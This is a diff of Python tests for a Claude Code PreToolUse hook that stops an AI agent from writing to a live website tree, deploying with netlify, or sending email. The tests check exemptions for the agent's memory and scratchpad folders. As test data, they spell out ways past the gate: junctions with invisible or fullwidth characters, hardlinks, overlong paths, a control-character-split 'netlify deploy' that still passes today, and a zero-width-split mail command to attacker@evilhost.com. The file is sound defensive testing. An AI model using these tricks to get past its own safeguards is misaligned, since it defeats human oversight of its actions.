@@ -22,6 +22,7 @@ test, so the suite never depends on (nor can be flipped by) a real live token
 from a concurrent session.
 """
 
+import ast
 import importlib.util
 import inspect
 import json
@@ -1157,8 +1158,575 @@ def test_stdin_decoded_as_utf8_not_platform_codepage():
     print("PASS test_stdin_decoded_as_utf8_not_platform_codepage")
 
 
+# ---------------------------------------------------------------------------
+# 2026-09-18 -- check_file_write's Claude-managed slug-directory exemption.
+#
+# Claude Code names two directories after the PROJECT PATH, so working in the site repo
+# produces slugs that embed a site marker while pointing nowhere near the site tree:
+#   ~/.claude/projects/C--Users-Owner-website-canonical/memory/
+#   %TEMP%/claude/C--Users-Owner-website-canonical/<session>/scratchpad/
+# Both blocked every Write (confirmed live, exit 2), so a session in this project could
+# not save a memory without minting a live-site write override. The exemption keys on the
+# RESOLVED real path only; these tests pin both the relief and its boundaries.
+# ---------------------------------------------------------------------------
+
+# The hook derives its anchor from its own location (hooks/ -> .claude/); mirror that
+# here so these tests follow the file whether it runs from a worktree or the live tree.
+CLAUDE_ROOT = os.path.dirname(HERE)
+SLUG = "C--Users-Owner-website-canonical"
+OTHER_MARKER = "oxford-site"
+
+
+def _load_hook_module():
+    """Import the hook for direct unit calls. main() is under a __main__ guard, so import
+    is side-effect-free apart from resolving the module-level exemption anchors."""
+    import importlib.util
+    spec = importlib.util.spec_from_file_location("ora_autonomy_gate_under_test", HOOK)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod
+
+
+def test_project_memory_write_allowed():
+    """The reported friction: this session's OWN memory directory is not the site tree."""
+    path = os.path.join(CLAUDE_ROOT, "projects", SLUG, "memory", "reference_x.md")
+    rc, out, err = run_hook(write_payload(path))
+    assert rc == 0, (
+        "a write to the project memory dir must not need a live-site override, got %s (%s)"
+        % (rc, err)
+    )
+    print("PASS test_project_memory_write_allowed")
+
+
+def test_session_scratchpad_write_allowed():
+    """The harness MANDATES the scratchpad for temp files, and its slug embeds the marker."""
+    path = os.path.join(tempfile.gettempdir(), "claude", SLUG, SESSION_A, "scratchpad", "n.txt")
+    rc, out, err = run_hook(write_payload(path))
+    assert rc == 0, (
+        "a write to the session scratchpad must not need a live-site override, got %s (%s)"
+        % (rc, err)
+    )
+    print("PASS test_session_scratchpad_write_allowed")
+
+
+def test_real_site_tree_write_still_blocks():
+    """Control for the two tests above -- the gate's actual job is untouched."""
+    for path in (SITE_FILE, "C:/Users/Owner/%s/index.html" % OTHER_MARKER):
+        rc, out, err = run_hook(write_payload(path))
+        assert rc == 2, "a real site-tree write must still block: %s got %s (%s)" % (path, rc, err)
+    print("PASS test_real_site_tree_write_still_blocks")
+
+
+def test_slug_dir_exemption_defeated_by_junction():
+    """The exemption keys on the RESOLVED path, so a directory named exactly like an
+    exempt scratchpad but junctioned INTO the site tree resolves back out of the
+    exemption and still blocks. This is the bypass a literal-text exemption would open."""
+    tmp = tempfile.mkdtemp(prefix="oag-slugjunc-")
+    real_site = os.path.join(tmp, "actual-target", "website-canonical")
+    os.makedirs(real_site, exist_ok=True)
+    fake = os.path.join(tempfile.gettempdir(), "claude", "oag-slugjunc-" + SESSION_A,
+                        SESSION_B, "scratchpad")
+    os.makedirs(os.path.dirname(fake), exist_ok=True)
+    proc = subprocess.run(["cmd", "/c", "mklink", "/J", fake, real_site],
+                          capture_output=True, text=True)
+    if proc.returncode != 0:
+        print("SKIP test_slug_dir_exemption_defeated_by_junction (junction unavailable: %s)"
+              % (proc.stderr or proc.stdout).strip())
+        return
+    try:
+        rc, out, err = run_hook(write_payload(os.path.join(fake, "index.html")))
+        assert rc == 2, (
+            "a scratchpad-shaped path junctioned into the site tree must still block, "
+            "got %s (%s)" % (rc, err)
+        )
+    finally:
+        subprocess.run(["cmd", "/c", "rmdir", fake], capture_output=True, text=True)
+        shutil.rmtree(tmp, ignore_errors=True)
+        shutil.rmtree(os.path.join(tempfile.gettempdir(), "claude",
+                                   "oag-slugjunc-" + SESSION_A), ignore_errors=True)
+    print("PASS test_slug_dir_exemption_defeated_by_junction")
+
+
+def test_dot_claude_inside_site_tree_not_exempt():
+    """The exemption is ANCHORED to the real Claude root, not to the shape alone -- so a
+    `.claude/projects/<slug>/memory/` directory sitting INSIDE a site checkout matches the
+    shape but not the anchor, and a write into the site repo still blocks."""
+    path = "C:/Users/Owner/website-canonical/.claude/projects/%s/memory/y.md" % SLUG
+    rc, out, err = run_hook(write_payload(path))
+    assert rc == 2, (
+        "a memory-shaped path inside the site checkout must still block, got %s (%s)"
+        % (rc, err)
+    )
+    print("PASS test_dot_claude_inside_site_tree_not_exempt")
+
+
+def test_slug_dir_exemption_is_narrow():
+    """Only the two named shapes are exempt. A sibling directory under the same project
+    slug, or the slug directory itself, still carries the marker and still blocks --
+    the fix relieves the reported friction, it does not open `~/.claude/projects/<slug>/`."""
+    for path in (
+        os.path.join(CLAUDE_ROOT, "projects", SLUG, "todos", "x.md"),
+        os.path.join(CLAUDE_ROOT, "projects", SLUG, "memory.md"),
+        os.path.join(tempfile.gettempdir(), "claude", SLUG, SESSION_A, "not-scratchpad", "n.txt"),
+    ):
+        rc, out, err = run_hook(write_payload(path))
+        assert rc == 2, "outside the exempt shapes must still block: %s got %s (%s)" % (
+            path, rc, err)
+    print("PASS test_slug_dir_exemption_is_narrow")
+
+
+def _junction(link_path, target):
+    """mklink /J, returning False when junctions are unavailable in this environment."""
+    os.makedirs(os.path.dirname(link_path), exist_ok=True)
+    proc = subprocess.run(["cmd", "/c", "mklink", "/J", link_path, target],
+                          capture_output=True, text=True)
+    return proc.returncode == 0
+
+
+def test_normalization_differential_junction_blocks():
+    """CRITICAL, adversarial review 2026-09-18. The exemption resolved the NORMALIZED path
+    while the Write tool opens the LITERAL one. A directory whose name differs from an
+    exempt directory only by a character that NFKC folds or that the Cf/Mn strip deletes is
+    a DIFFERENT object to Windows and the SAME object to this hook -- so a junction named
+    `scratchpad<ZWSP>` pointing into a site checkout was exempted while the bytes landed in
+    the site tree (exit 0, proven). `mklink` is not a write indicator, so Gate 2b does not
+    see the junction being created either: the whole chain needed no override.
+
+    Each variant below is test_slug_dir_exemption_defeated_by_junction with ONE character
+    changed. They must all block."""
+    tmp = tempfile.mkdtemp(prefix="oag-normdiff-")
+    real_site = os.path.join(tmp, "actual-target", "website-canonical")
+    os.makedirs(real_site, exist_ok=True)
+    variants = [
+        ("zero-width space (Cf, stripped)", u"scratchpad\u200b"),
+        ("fullwidth latin (NFKC-folded)", u"\uff53\uff43\uff52\uff41\uff54\uff43\uff48"
+                                          u"\uff50\uff41\uff44"),
+        ("combining low line (Mn, stripped)", u"scratchpad\u0332"),
+    ]
+    made_any = False
+    for label, component in variants:
+        base = os.path.join(tempfile.gettempdir(), "claude",
+                            "oag-normdiff-" + SESSION_A, SESSION_B + label[:3])
+        link = os.path.join(base, component)
+        if not _junction(link, real_site):
+            continue
+        made_any = True
+        try:
+            assert _normalize_for_matching_component(component) != component, (
+                "test setup bug: %s must not be a normalization fixed point" % label)
+            rc, out, err = run_hook(write_payload(os.path.join(link, "index.html")))
+            assert rc == 2, (
+                "a junction into the site tree named `%s` must block, got %s (%s)"
+                % (label, rc, err)
+            )
+        finally:
+            # rmdir the LINK, then remove the sandbox parent. Removing only the link
+            # leaves junction sandboxes outliving the session that made them, and a
+            # future pass that points one at the real checkout and forgets it would
+            # leave a standing alias into the live site tree (adversarial review,
+            # 2026-09-18, which found this suite's own leftovers still on disk).
+            subprocess.run(["cmd", "/c", "rmdir", link], capture_output=True, text=True)
+            shutil.rmtree(base, ignore_errors=True)
+    shutil.rmtree(tmp, ignore_errors=True)
+    shutil.rmtree(os.path.join(tempfile.gettempdir(), "claude",
+                               "oag-normdiff-" + SESSION_A), ignore_errors=True)
+    if not made_any:
+        print("SKIP test_normalization_differential_junction_blocks (junctions unavailable)")
+        return
+    print("PASS test_normalization_differential_junction_blocks")
+
+
+def _normalize_for_matching_component(text):
+    """Local mirror of the hook's normalization, for test SETUP assertions only."""
+    import unicodedata
+    folded = unicodedata.normalize("NFKC", text)
+    return "".join(ch for ch in folded
+                   if unicodedata.category(ch) not in ("Cf", "Mn"))
+
+
+def test_invisible_char_junction_blocks_without_any_slug():
+    """Same root cause, but PRE-EXISTING on main and reachable with no slug directory
+    anywhere: a junction whose name carries an invisible character, sitting in an ordinary
+    temp directory, resolved to the site tree while the hook resolved the normalized name
+    to something else -- exit 0 on both main and the first draft of this branch. Marker-
+    matching the realpath of the RAW path closes it. No exemption is involved; this pins
+    the base gate."""
+    tmp = tempfile.mkdtemp(prefix="oag-plainjunc-")
+    real_site = os.path.join(tmp, "actual-target", "oxford-site")
+    os.makedirs(real_site, exist_ok=True)
+    link = os.path.join(tmp, u"mem\u200bory")
+    if not _junction(link, real_site):
+        print("SKIP test_invisible_char_junction_blocks_without_any_slug (junctions unavailable)")
+        return
+    target = os.path.join(link, "a.html")
+    assert not any(m in target.replace("\\", "/").lower()
+                   for m in ("website-canonical", "oxford-site")), (
+        "test setup bug: the literal path must name no site marker")
+    try:
+        rc, out, err = run_hook(write_payload(target))
+        assert rc == 2, (
+            "a write reaching the site tree through an invisible-character junction must "
+            "block even with no slug directory involved, got %s (%s)" % (rc, err)
+        )
+    finally:
+        subprocess.run(["cmd", "/c", "rmdir", link], capture_output=True, text=True)
+        shutil.rmtree(tmp, ignore_errors=True)
+    print("PASS test_invisible_char_junction_blocks_without_any_slug")
+
+
+def test_embedded_nul_path_is_not_exempt():
+    """os.path.realpath() swallows the ValueError for an embedded NUL and returns an
+    UNRESOLVED normpath, so the exemption would have been reachable on a path the
+    filesystem never confirmed. Benign today only because Node refuses NUL in paths --
+    pinned so it stays that way."""
+    path = os.path.join(tempfile.gettempdir(), "claude", SLUG, SESSION_A,
+                        "scratchpad", "c\x00.txt")
+    rc, out, err = run_hook(write_payload(path))
+    assert rc == 2, "a NUL-bearing path must never be exempt, got %s (%s)" % (rc, err)
+    print("PASS test_embedded_nul_path_is_not_exempt")
+
+
+def test_gettempdir_failure_yields_no_anchor_not_a_crash():
+    """The branch test_hostile_temp_vars_do_not_disable_the_gate does NOT reach (adversarial
+    review, 2026-09-18: with the temp vars SET, `_temp_dir_names()` returns them and the
+    guarded gettempdir() call is never made, so that test proves the env path only).
+
+    A module-level tempfile.gettempdir() raises FileNotFoundError when no candidate temp dir
+    is writable, and this hook exiting 1 is treated as NON-BLOCKING by the harness -- so an
+    unguarded traceback would not merely lose the exemption, it would silently disable Gates
+    1/2a/2b/2c for that call. Strictly worse than any narrowing miss. Clear the vars so the
+    fallback is actually taken, and make it raise."""
+    mod = _load_hook_module()
+    saved_env = dict(os.environ)
+    saved_gettempdir = mod.tempfile.gettempdir
+    try:
+        for var in ("TEMP", "TMP", "TMPDIR"):
+            os.environ.pop(var, None)
+
+        def _boom():
+            raise FileNotFoundError("No usable temporary directory found")
+
+        mod.tempfile.gettempdir = _boom
+        assert mod._temp_dir_names() == [], (
+            "a raising gettempdir() with no temp vars set must yield NO anchor, not an "
+            "exception: got %r" % (mod._temp_dir_names(),)
+        )
+    finally:
+        mod.tempfile.gettempdir = saved_gettempdir
+        os.environ.clear()
+        os.environ.update(saved_env)
+    print("PASS test_gettempdir_failure_yields_no_anchor_not_a_crash")
+
+
+def test_existing_hardlink_forfeits_the_exemption():
+    """A hardlink is a second NAME for one inode, not a reparse point -- realpath() has
+    nothing to follow, so a file inside an exempt directory that is hardlinked to a site
+    file would be written through the exempt name. The general hardlink class is documented
+    as deferred and is reachable today through any marker-free path with no exemption
+    involved; this pins only that the exemption does not become a second, more convenient
+    spelling of it (adversarial review, 2026-09-18)."""
+    tmp = tempfile.mkdtemp(prefix="oag-hardlink-")
+    site_dir = os.path.join(tmp, "target", "website-canonical")
+    os.makedirs(site_dir, exist_ok=True)
+    site_file = os.path.join(site_dir, "index.html")
+    with open(site_file, "w") as handle:
+        handle.write("original")
+    # The slug component must be the REAL marker-bearing slug: with a marker-free slug the
+    # path trips no marker match at all, the gate returns without ever reaching the
+    # exemption, and the test would pass vacuously against the pre-existing hardlink class
+    # rather than against this exemption.
+    exempt_dir = os.path.join(tempfile.gettempdir(), "claude", SLUG,
+                              "oag-hardlink-" + SESSION_B, "scratchpad")
+    os.makedirs(exempt_dir, exist_ok=True)
+    link = os.path.join(exempt_dir, "hl.txt")
+    try:
+        os.link(site_file, link)
+    except (OSError, NotImplementedError, AttributeError) as exc:
+        print("SKIP test_existing_hardlink_forfeits_the_exemption (hardlinks unavailable: %s)"
+              % exc)
+        shutil.rmtree(tmp, ignore_errors=True)
+        return
+    try:
+        rc, out, err = run_hook(write_payload(link))
+        assert rc == 2, (
+            "an exempt-shaped path that is already a hardlink must forfeit the exemption, "
+            "got %s (%s)" % (rc, err)
+        )
+        # Control: an ordinary new file in the same exempt directory still passes, so the
+        # guard costs nothing in the case this whole change exists to enable.
+        rc, out, err = run_hook(write_payload(os.path.join(exempt_dir, "ordinary.txt")))
+        assert rc == 0, "an ordinary scratchpad write must still pass, got %s (%s)" % (rc, err)
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+        # Remove the session PARENT, not just the scratchpad leaf, or an empty
+        # oag-hardlink-* directory outlives every run (adversarial re-review, 2026-09-18).
+        shutil.rmtree(os.path.dirname(exempt_dir), ignore_errors=True)
+    print("PASS test_existing_hardlink_forfeits_the_exemption")
+
+
+def test_overlong_exempt_path_blocks_and_does_not_crash():
+    """os.stat() raises ValueError -- NOT OSError -- at >= 32768 characters on Windows
+    ("stat: path too long for Windows"), while os.path.realpath() at that length does not
+    raise. So resolve_ok stays True, the four earlier exemption conditions pass on an
+    exempt-SHAPED path, and an uncaught throw in _is_multiply_linked escapes
+    check_file_write. This hook exiting 1 is NON-BLOCKING, so that would disable Gates
+    1/2a/2b/2c for the call -- strictly worse than any narrowing miss, and the exact class
+    the realpath guard already catches. Exit 1 is the failure this pins; exit 2 is the
+    contract (adversarial re-review, 2026-09-18)."""
+    path = os.path.join(tempfile.gettempdir(), "claude", SLUG, SESSION_A, "scratchpad",
+                        "a" * 40000)
+    rc, out, err = run_hook(write_payload(path))
+    assert rc != 1, (
+        "an overlong exempt-shaped path must never crash the hook to exit 1 (the harness "
+        "treats that as NON-BLOCKING, disabling every gate for this call): %s" % err[:400]
+    )
+    assert rc == 2, "an overlong exempt-shaped path must block, got %s (%s)" % (rc, err)
+    print("PASS test_overlong_exempt_path_blocks_and_does_not_crash")
+
+
+def test_hostile_temp_vars_do_not_disable_the_gate():
+    """Every temp variable pointed at a nonexistent directory: the site-tree write must
+    still BLOCK (exit 2), never crash (exit 1). Covers the env path; the guarded
+    gettempdir() fallback is covered by the test above."""
+    env_overrides = {"TMPDIR": r"Z:\no-such-temp-dir",
+                     "TEMP": r"Z:\no-such-temp-dir",
+                     "TMP": r"Z:\no-such-temp-dir"}
+    env = dict(os.environ)
+    env.update(env_overrides)
+    env["ORA_OVERRIDE_SESSIONS_DIR"] = fresh_sessions_dir()
+    payload = {"tool_name": "Write",
+               "tool_input": {"file_path": SITE_FILE, "content": "x"},
+               "session_id": SESSION_A}
+    proc = subprocess.run([sys.executable, HOOK], input=json.dumps(payload),
+                          capture_output=True, text=True, env=env)
+    assert proc.returncode == 2, (
+        "with no usable temp dir the gate must still BLOCK a site write, got %s (%s)"
+        % (proc.returncode, proc.stderr)
+    )
+    print("PASS test_hostile_temp_vars_do_not_disable_the_gate")
+
+
+def test_exemption_anchor_refuses_site_contaminated_root():
+    """If the hook layer itself were ever relocated under a site checkout, the anchor must
+    be discarded rather than becoming a write hole into that checkout."""
+    mod = _load_hook_module()
+    assert mod._exemption_anchor("C:/Users/Owner/website-canonical/.claude") is None, (
+        "an anchor root inside the site tree must yield no exemption"
+    )
+    assert mod._exemption_anchor("C:/Users/Owner/%s/.claude" % OTHER_MARKER) is None, (
+        "an anchor root inside the second site checkout must yield no exemption"
+    )
+    assert mod._exemption_anchor(CLAUDE_ROOT) is not None, (
+        "control: the real Claude root must resolve to a usable anchor"
+    )
+    print("PASS test_exemption_anchor_refuses_site_contaminated_root")
+
+
+# --------------------------------------------------------------------------
+# STRIP_CATEGORIES single-source-of-truth (2026-09-18)
+#
+# Until this change the gate carried its OWN `_STRIP_CATEGORIES = ("Cf", "Mn")`,
+# duplicating hooks/lib/tool_call_paths.py's copy (which feeds normalize_text for three of
+# its six importing guards). Nothing kept them in sync, and the failure mode was silent and
+# one-directional: harden the lib copy, forget this one, and the hook with the broadest
+# blast radius -- the SOLE enforcement of hard invariant 2 under bypassPermissions, where
+# no permission prompt exists as a backstop -- quietly becomes the layer's WEAKEST
+# normalizer while the guards routing through normalize_text are stronger. No test goes
+# red; nothing throws.
+#
+# The tests below pin the three things that make the collapse real rather than cosmetic:
+# the gate's behavior FOLLOWS the shared module (not a local copy), the one hardcoded
+# fallback copy that must survive a missing module cannot drift from it, and the fallback
+# actually keeps both gates armed.
+# --------------------------------------------------------------------------
+
+LIB_DIR = os.path.join(HERE, "lib")
+
+# A Cc control character mid-word is the differential probe: it is NOT in the shipped
+# category set, so it currently defeats the `\bnetlify\b` match exactly the way a ZWSP did
+# before Round 3 -- verified live, exit 0 below. That makes it the one input whose verdict
+# flips when, and only when, the SHARED module's tuple changes.
+CTRL_SPLIT_DEPLOY = "cmd /c net\x01lify deploy --build --prod"
+
+
+def _shared_strip_categories():
+    """The canonical tuple, loaded from hooks/lib/text_normalization.py by path so this
+    test never depends on sys.path ordering (or on the gate having imported it)."""
+    spec = importlib.util.spec_from_file_location(
+        "_text_normalization_under_test", os.path.join(LIB_DIR, "text_normalization.py"))
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod.STRIP_CATEGORIES
+
+
+_ISO_ROOTS = []
+
+
+def _isolated_gate(shared_module_source=None, drop_shared_module=False):
+    """Copy the gate + the whole lib/ into a temp tree and return the copied gate's path,
+    optionally rewriting or deleting the shared normalization module in that copy ONLY.
+    The real tree is never touched. Roots are registered for cleanup at the end of the
+    run (sibling tests clean their sandboxes; these copy the whole lib/ three times)."""
+    root = tempfile.mkdtemp(prefix="oag-iso-")
+    _ISO_ROOTS.append(root)
+    hooks_dir = os.path.join(root, "hooks")
+    os.makedirs(hooks_dir)
+    shutil.copy2(HOOK, os.path.join(hooks_dir, "ora-autonomy-gate.py"))
+    shutil.copytree(LIB_DIR, os.path.join(hooks_dir, "lib"))
+    target = os.path.join(hooks_dir, "lib", "text_normalization.py")
+    if drop_shared_module:
+        os.remove(target)
+    elif shared_module_source is not None:
+        with open(target, "w", encoding="ascii") as fh:
+            fh.write(shared_module_source)
+    return os.path.join(hooks_dir, "ora-autonomy-gate.py")
+
+
+def _run_gate(gate_path, command):
+    env = dict(os.environ)
+    env["ORA_OVERRIDE_SESSIONS_DIR"] = fresh_sessions_dir()
+    # Scrub PYTHONPATH (2026-09-18 review finding): it is INHERITED, so a developer or CI
+    # runner with the real hooks/lib on PYTHONPATH would let the copied gate import the
+    # REAL text_normalization.py -- and the drop_shared_module test would pass vacuously,
+    # proving nothing. Verified: with PYTHONPATH set to the real lib, the missing-module
+    # case still returned exit 2 because the module was found elsewhere.
+    env.pop("PYTHONPATH", None)
+    proc = subprocess.run(
+        [sys.executable, gate_path],
+        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command},
+                          "session_id": SESSION_A}),
+        capture_output=True, text=True, env=env,
+    )
+    return proc.returncode, proc.stderr
+
+
+def test_control_char_split_netlify_is_the_live_differential():
+    """Control (baseline) for the test below, and a standing statement of scope: Cc is NOT
+    stripped today, so a control character mid-word still defeats Gate 2a. That is the
+    SHIPPED posture -- widening the category set is a deliberate decision with its own
+    false-positive budget, not something to slip in here. This test exists so the
+    differential test below cannot silently become a tautology if Cc is ever added: add it
+    and this test goes red first, on purpose."""
+    rc, out, err = run_hook(bash_payload(CTRL_SPLIT_DEPLOY))
+    assert rc == 0, (
+        "premise broken: a Cc-split 'netlify' is expected to pass on the shipped category "
+        "set (that is what makes it a usable differential probe), got exit %s" % rc)
+    print("PASS test_control_char_split_netlify_is_the_live_differential")
+
+
+def test_strip_categories_comes_from_shared_module():
+    """THE test the duplication defeated. Harden ONLY hooks/lib/text_normalization.py --
+    nothing in the gate -- and the gate's verdict must change. Before 2026-09-18 the gate
+    read its own copy, so this input stayed exit 0 no matter what the shared module said,
+    which is precisely the silent divergence this change closes."""
+    hardened = ('"""Hardened copy for test_strip_categories_comes_from_shared_module.\n'
+                'ASCII-only."""\n'
+                'STRIP_CATEGORIES = ("Cf", "Mn", "Cc")\n')
+    gate = _isolated_gate(shared_module_source=hardened)
+    rc, err = _run_gate(gate, CTRL_SPLIT_DEPLOY)
+    assert rc == 2, (
+        "adding Cc to the SHARED module must arm the gate against a Cc-split 'netlify' "
+        "(it is exit 0 on the shipped set -- see the control test). Got exit %s (%s). "
+        "A still-passing call here means the gate is reading a LOCAL copy of "
+        "STRIP_CATEGORIES again." % (rc, err))
+    # ... and the unmodified copy of the same tree must still allow it, so the result above
+    # is attributable to the one-line module edit and not to the copying itself.
+    rc_ctl, _ = _run_gate(_isolated_gate(), CTRL_SPLIT_DEPLOY)
+    assert rc_ctl == 0, (
+        "control: an UNMODIFIED copied tree must reproduce the shipped verdict (exit 0), "
+        "got %s -- the differential above is not attributable" % rc_ctl)
+    print("PASS test_strip_categories_comes_from_shared_module")
+
+
+def test_strip_categories_fallback_matches_shared_module():
+    """The gate keeps ONE hardcoded fallback copy, because an uncaught ImportError exits 1,
+    which PreToolUse treats as a non-blocking error -- the tool call PROCEEDS and both
+    gates go silently off. That copy is therefore mandatory, and it is also the only thing
+    left that can drift, so it is pinned here BY VALUE against the shared module.
+
+    Parsed with ast rather than imported: importing the gate would resolve the try branch
+    and never show what the except branch actually holds.
+
+    The structural check is deliberately STRICT about placement (2026-09-18 review: a
+    looser `ast.walk` version accepted 5 of 7 dead-code placements -- a nested def, an
+    `if False:`, a class body, an unrelated handler elsewhere in the file -- each of which
+    leaves the gate exiting 1 when the module is missing, and it false-RED'd a valid
+    annotated assignment). The fallback must be a DIRECT statement of the handler attached
+    to the try that imports the name."""
+    with open(HOOK, encoding="utf-8") as fh:
+        tree = ast.parse(fh.read())
+
+    def _targets_name(node):
+        if isinstance(node, ast.Assign):
+            return any(isinstance(t, ast.Name) and t.id == "STRIP_CATEGORIES"
+                       for t in node.targets)
+        if isinstance(node, ast.AnnAssign):  # `STRIP_CATEGORIES: tuple = (...)` is valid
+            return isinstance(node.target, ast.Name) and node.target.id == "STRIP_CATEGORIES"
+        return False
+
+    assigns = [n for n in ast.walk(tree) if _targets_name(n)]
+    assert len(assigns) == 1, (
+        "expected exactly ONE assignment of STRIP_CATEGORIES in the gate (the import "
+        "fallback); found %d. A second one is the duplicate this change removed, "
+        "reintroduced." % len(assigns))
+
+    # Find the try whose BODY imports STRIP_CATEGORIES, and require the assignment to be a
+    # direct child statement of one of THAT try's handlers -- not merely somewhere beneath
+    # some except in the file.
+    owning_handlers = []
+    for tr in [n for n in ast.walk(tree) if isinstance(n, ast.Try)]:
+        imports_it = any(
+            isinstance(s, ast.ImportFrom)
+            and any(a.name == "STRIP_CATEGORIES" for a in s.names)
+            for s in ast.walk(ast.Module(body=tr.body, type_ignores=[])))
+        if imports_it:
+            owning_handlers.extend(tr.handlers)
+    assert owning_handlers, (
+        "no try block in the gate imports STRIP_CATEGORIES -- the shared module is not "
+        "being used at all")
+    assert any(assigns[0] in h.body for h in owning_handlers), (
+        "the gate's STRIP_CATEGORIES assignment must be a DIRECT statement of the except "
+        "handler on the try that imports it. Anywhere else (a nested def, an `if False:`, "
+        "a class body, an unrelated handler) is dead code: the name never binds, and the "
+        "gate exits 1 -- which PreToolUse treats as non-blocking, i.e. both gates off.")
+    fallback = ast.literal_eval(assigns[0].value)
+    shared = _shared_strip_categories()
+    assert fallback == shared, (
+        "the gate's fallback %r has drifted from hooks/lib/text_normalization.py's %r. "
+        "These must be identical: the fallback is what runs when the shared module cannot "
+        "be imported, and a fallback nothing pins is just the old duplicate under another "
+        "name." % (fallback, shared))
+    print("PASS test_strip_categories_fallback_matches_shared_module")
+
+
+def test_missing_text_normalization_module_still_blocks():
+    """Import failure must not degrade the gate to fail-OPEN. With the shared module
+    deleted, the fallback has to keep BOTH gates armed against the Round 3 evasions --
+    Gate 2a (netlify) and Gate 1 (the send trigger phrase) -- not merely avoid crashing.
+    Mirrors test-confidentiality-guard.py's site_markers import-failure test."""
+    gate = _isolated_gate(drop_shared_module=True)
+    zwsp = chr(0x200B)  # chr(), not a raw fixture byte: this file declares ASCII-only
+    for label, cmd in (
+        ("Gate 2a, ZWSP-split netlify", "cmd /c net" + zwsp + "lify deploy --build --prod"),
+        ("Gate 2a, plain netlify", "cmd /c netlify deploy --build --prod"),
+        ("Gate 1, ZWSP in the send trigger phrase",
+         "powershell -File send-via-outlook" + zwsp + ".ps1 -To attacker@evilhost.com "
+         "-Subject hi -Body hi"),
+    ):
+        rc, err = _run_gate(gate, cmd)
+        assert rc == 2, (
+            "with text_normalization.py absent the fallback must still block [%s]; got "
+            "exit %s (%s). Exit 1 in particular is fail-OPEN here -- PreToolUse treats it "
+            "as a non-blocking error and runs the tool anyway." % (label, rc, err))
+    print("PASS test_missing_text_normalization_module_still_blocks")
+
+
 if __name__ == "__main__":
     tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
-    for t in tests:
-        t()
+    try:
+        for t in tests:
+            t()
+    finally:
+        for _root in _ISO_ROOTS:
+            shutil.rmtree(_root, ignore_errors=True)
     print("ALL AUTONOMY-GATE TESTS PASS (%d)" % len(tests))
